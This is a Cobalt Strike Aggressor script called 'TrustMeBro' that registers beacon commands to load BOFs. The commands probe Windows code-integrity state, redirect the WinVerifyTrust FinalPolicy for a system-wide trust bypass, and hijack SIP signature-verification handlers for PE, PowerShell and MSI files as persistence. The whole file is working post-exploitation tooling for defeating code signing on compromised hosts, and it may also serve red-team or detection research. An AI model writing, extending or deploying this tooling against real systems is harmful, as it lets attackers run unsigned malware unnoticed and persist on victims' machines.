# tmb.cna - TrustMeBro Cobalt Strike Aggressor Script
#
# Unified command router. Loads individual BOFs per subcommand.
# Usage: tmb <subcommand> [args]

# BOF directory relative to this script
$bof_dir = script_resource("../bin");

# Helper: load and execute a BOF with packed arguments
sub tmb_exec {
    local('$bof_path $bof_data $args');
    $bof_path = $bof_dir . "/" . $1 . ".o";
    
    if (!-exists $bof_path) {
        berror($2, "BOF not found: $bof_path");
        return;
    }
    
    $bof_data = readbof($bof_path);
    btask($2, "TrustMeBro: $1");
    beacon_inline_execute($2, $bof_data, "go", $3);
}

sub readbof {
    local('$handle $data');
    $handle = openf($1);
    $data = readb($handle, -1);
    closef($handle);
    return $data;
}

# ---- tmb probe ----
alias tmb_probe {
    tmb_exec("tmb_probe", $1, $null);
}

beacon_command_register(
    "tmb_probe",
    "Query local CI enforcement state (HVCI, test-signing, SAC)",
    "Usage: tmb_probe\n\nNo arguments. No writes. No admin required."
);

# ---- tmb finalpolicy ----
alias tmb_finalpolicy {
    local('$action $args');
    $action = 0; # default: hijack
    
    if ($2 eq "--clean" || $2 eq "clean") {
        $action = 1;
    }
    
    $args = bof_pack($1, "s", $action);
    tmb_exec("tmb_finalpolicy", $1, $args);
}

beacon_command_register(
    "tmb_finalpolicy",
    "Redirect FinalPolicy to SoftpubCleanup (system-wide trust bypass)",
    "Usage: tmb_finalpolicy [--clean]\n\n  --clean  Restore FinalPolicy to default\n\nRequires admin. Log out and log back in for full effect."
);

# ---- tmb sip_hijack ----
alias tmb_sip_hijack {
    local('$action $flags $guids $args $i');
    $action = 0;
    $flags = 0;
    $guids = "pe,ps1,msi"; # default
    
    for ($i = 1; $i < size(@_); $i++) {
        if (@_[$i] eq "--clean") { $action = 1; }
        else if (@_[$i] eq "--all-sips") { $flags = $flags | 1; }
        else if (@_[$i] eq "--sac") { $flags = $flags | 2; }
        else if (@_[$i] eq "--sip-types" && ($i + 1) < size(@_)) {
            $i++;
            $guids = @_[$i];
        }
    }
    
    $args = bof_pack($1, "ssz", $action, $flags, $guids);
    tmb_exec("tmb_sip_hijack", $1, $args);
}

beacon_command_register(
    "tmb_sip_hijack",
    "Install SIP persistence (redirect VerifyIndirectData to DbgUiContinue)",
    "Usage: tmb_sip_hijack [--sip-types pe,ps1,msi] [--all-sips] [--sac] [--clean]\n\n  --sip-types  Comma-separated aliases (default: pe,ps1,msi)\n  --all-sips   All 17 standard SIPs\n  --sac        Include Smart App Control (Win11)\n  --clean      Restore to defaults\n\nRequires admin. Log out and log back in."
);

